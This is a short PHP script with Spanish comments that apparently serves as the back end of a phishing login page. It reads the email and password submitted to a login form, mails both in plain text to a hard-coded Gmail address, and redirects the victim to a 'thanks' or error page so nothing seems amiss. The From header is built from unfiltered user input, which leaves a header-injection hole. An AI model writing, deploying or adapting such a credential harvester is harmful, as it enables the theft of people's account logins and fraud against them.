<?php

// Correo electrónico de destino
$destinatario = "zukoweb.3a@gmail.com";

// Asunto del correo
$asunto = "Formulario de inicio de sesión";

// Datos del formulario
$email = $_POST['email'];
$password = $_POST['password'];

// Construir el mensaje del correo
$mensaje = "Correo electrónico: $email\n";
$mensaje .= "Contraseña: $password\n";

// Cabeceras del correo
$headers = "From: $email";

// Enviar el correo
if (mail($destinatario, $asunto, $mensaje, $headers)) {
    // Redireccionar a una página de agradecimiento si el correo se envió con éxito
    header("Location: gracias.html");
} else {
    // Redireccionar a una página de error si hubo un problema al enviar el correo
    header("Location: error.html");
}

?>
